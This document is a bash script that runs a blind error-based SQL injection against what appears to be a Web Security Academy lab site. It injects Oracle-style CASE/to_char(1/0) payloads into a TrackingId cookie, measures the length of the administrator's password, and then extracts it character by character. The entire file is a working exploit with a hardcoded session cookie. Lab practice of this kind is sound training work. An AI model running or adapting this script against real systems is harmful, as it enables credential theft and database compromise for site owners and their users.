#!/bin/bash


#stuff="1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
stuff="1234567890abcdefghijklmnopqrstuvwxyz"
password_length=0
counter=0

while $true; do
    if curl -s -k "https://0abe007704d62306c104477b0013002f.web-security-academy.net/filter?category=Pets" --cookie "TrackingId=WF2nE56erCHHhPmJ'||(SELECT CASE WHEN LENGTH(password)>$counter THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=liX8U8rtNlQwOXIEndgGjjCGZsBZNg89" | grep "Internal Server Error" > /dev/null;then 
        let password_length++
        let counter++
    else
        break
    fi
done


for i in $( seq 1 $password_length )
do
    while read -n1 character; do
        if curl -s -k "https://0abe007704d62306c104477b0013002f.web-security-academy.net/filter?category=Pets" --cookie "TrackingId=WF2nE56erCHHhPmJ'||(SELECT CASE WHEN SUBSTR(password,$i,1)='$character' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=liX8U8rtNlQwOXIEndgGjjCGZsBZNg89" | grep "Internal Server Error" > /dev/null;then 
             echo -n $character
         fi
    done < <(echo -n "$stuff")
done

